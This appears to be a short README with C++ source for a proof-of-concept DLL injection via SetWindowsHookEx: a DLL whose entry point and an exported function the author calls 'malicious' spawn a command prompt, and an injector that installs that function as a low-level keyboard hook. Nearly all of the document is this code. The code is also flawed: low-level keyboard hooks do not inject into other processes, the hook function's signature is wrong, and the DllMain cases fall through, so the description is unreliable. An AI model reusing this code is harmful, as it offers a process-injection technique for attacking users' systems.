# SetWindowHookEx-and-inject-a-dll
After creating a DLL there is malicious function in DLL and we write a c++ which hook keyboard and inject the specific function in to main process of c++ program or even in other processes.
<h2>DLL functions.</h2>

#include "pch.h"
#include <iostream>
using namespace std;

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        system("start cmd");
    case DLL_THREAD_ATTACH:
        system("start cmd");
    case DLL_THREAD_DETACH:
        system("start cmd");
    case DLL_PROCESS_DETACH:
        system("start cmd");
        break;
    }
    return TRUE;
}
BOOL APIENTRY injext(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    system("start cmd");
    return true;
}

<br>
  <h2>Injector</h2>
  
#include <iostream>
#include <Windows.h>

int main()
{
	HMODULE library = LoadLibraryA("load.dll");
	HOOKPROC hookProc = (HOOKPROC)GetProcAddress(library, "injext");

	HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, hookProc, library, 0);
	Sleep(5000);
	UnhookWindowsHookEx(hook);

	return 0;
}
